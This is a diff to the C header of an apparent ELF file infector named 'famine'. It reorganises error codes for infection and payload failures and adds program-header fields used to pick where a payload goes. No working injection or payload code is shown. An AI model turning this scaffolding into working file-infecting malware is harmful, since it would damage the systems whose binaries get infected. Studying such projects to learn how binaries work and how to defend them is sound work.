@@ -64,6 +64,8 @@ enum e_error
     ERROR_LSEEK,
     ERROR_MMAP,
     ERROR_STAT,
+    // Input error
+    ERROR_INPUT_ARGUMENTS_NUMBERS,
     // File type error
     ERROR_NOT_ELF,
     ERROR_NOT_ELF32,
@@ -71,6 +73,8 @@ enum e_error
     ERROR_NOT_EXECUTABLE_BINARY,
     ERROR_ELF_NOT_LITTLE_ENDIAN,
     ERROR_FILE_IS_ALREADY_INFECTED,
+    // Infection error
+    ERROR_SECTION_NOT_FOUND,
     // Payload error
     ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD,
     ERROR_RET2OEP_NOT_FOUND,
@@ -81,9 +85,8 @@ enum e_error
     ERROR_GETTEXTSIZE_NOT_FOUND,
     // Functions specific error
     ERROR_CONCAT_STRINGS,
-    // Others error
-    ERROR_INPUT_ARGUMENTS_NUMBERS,
-    NB_OF_ERROR_CODES /* Always keep last */
+    // Always keep last
+    NB_OF_ERROR_CODES
 };
 
 #define DEBUG false
@@ -141,6 +144,8 @@ typedef struct s_famine
 
     t_elf_ehdr *ehdr;
     t_elf_phdr *phdr;
+    t_elf_phdr p_note;
+    t_elf_phdr p_data;
     t_elf_shdr *shdr;
     t_elf_addr new_entry_point;
     t_elf_addr old_entry_point;
